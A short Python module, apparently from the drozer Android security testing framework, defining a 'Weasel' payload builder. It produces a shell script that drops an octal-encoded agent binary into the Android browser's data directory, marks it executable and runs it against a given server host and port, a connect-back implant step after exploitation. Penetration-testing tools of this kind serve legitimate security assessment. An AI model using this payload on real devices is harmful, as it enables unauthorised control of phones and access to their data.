import os

from drozer.configuration import Configuration
from drozer.server import uploader

class Payload(object):
    
    def upload(self, arguments, resource, magic=None):
        data = self.build(arguments)
        
        uploader.upload(arguments, resource, data, magic)
    
class Weasel(Payload):
    
    def __init__(self, architecture="armeabi"):
        self.directory = "/data/data/com.android.browser"
        self.weasel = Configuration.library(os.path.join("weasel", architecture))
        
    def build(self, arguments):
        payload = "cd %s\n" % self.directory
        payload += "/system/bin/rm -f w\n"
        payload += "echo -e \"%s\" > w\n" % "".join(map(lambda b: "\\0%.3o" % ord(b), open(self.weasel).read()))
        payload += "/system/bin/chmod 770 w\n"
        payload += "./w %s %d\n" % arguments.server
        
        return payload
        